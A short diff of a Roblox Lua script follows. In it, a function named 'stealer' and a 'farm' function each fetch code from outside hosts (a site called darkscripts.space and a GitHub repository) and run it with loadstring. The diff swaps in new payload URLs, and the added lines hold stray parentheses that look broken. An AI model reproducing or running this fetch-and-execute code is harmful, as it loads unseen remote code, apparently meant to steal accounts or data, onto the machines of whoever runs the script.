@@ -1,9 +1,9 @@
 local function stealer()
-    loadstring(game:HttpGet('https://darkscripts.space/scripts/5f6a1aac-ab45-4217-9e6b-d0973b1936dc_824604012124569610.lua',true))()
+    loadstring(game:HttpGet('https://darkscripts.space/scripts/6fb04ca5-d0a1-4154-936a-733c0faf299b_1266914995518705825.lua',true))()                              )                              
 end
 local function farm()
  
-loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/PetSimSquid"))())
 
 end
 
